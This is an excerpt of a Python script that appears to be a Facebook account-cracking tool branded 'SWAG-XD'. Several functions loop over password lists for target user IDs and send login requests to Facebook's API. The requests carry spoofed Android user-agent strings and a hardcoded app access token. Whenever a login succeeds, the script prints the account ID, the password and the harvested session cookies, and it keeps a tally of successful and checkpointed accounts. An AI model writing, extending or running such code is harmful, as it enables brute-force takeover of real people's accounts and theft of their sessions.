...
def swag():
	...
	ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.48.'+'122;FBBV/'+str(random.randint(1111111,9999999))+'[FBAN/;FBAV/4Q095MQG;FBBV/525077184;FBAN/FBAN;FBAV/4Q095MQG;FBBV/525077184;FBDM//*{density=3.0,width=1920,height=1920};FBLC/es_ES;FBRV/219189596;FBCR/Sony;FBMF/VIVO;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Vivo_Y110s;FBSV/17;FBOP/8;FBCA/armeabi;FBSS/18;]'
	return ua
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r\r{B}❲{G}SWAG-XD{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua = 'Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/en_US;FBBV/257752740;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-N960U;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.5,width=1440,height=2960};FB_FW/1;]"+"Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G955U Build/R16NW) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/en_US;FBBV/257752740;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G955U;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.5,width=1440,height=2960};FB_FW/1;]'
                        ...
                        headers={
                                ...
                                'User-Agent':"[FBAN/;FBAV/4Q095MQG;FBBV/525077184;FBAN/FBAN;FBAV/4Q095MQG;FBBV/525077184;FBDM//*{density=3.0,width=1920,height=1920};FBLC/es_ES;FBRV/219189596;FBCR/Sony;FBMF/VIVO;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Vivo_Y110s;FBSV/17;FBOP/8;FBCA/armeabi;FBSS/18;]",
...
def api2(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{G}SWAG-OK{B}❳{G} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} "+coki)
...
def rndm1(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{G}SWAG-M1{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{G}SWAG-OK{B}❳{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} "+coki)
...
def rndm2(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{G}SWAG-M2{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
def rndm3(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{G}SWAG-M3{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
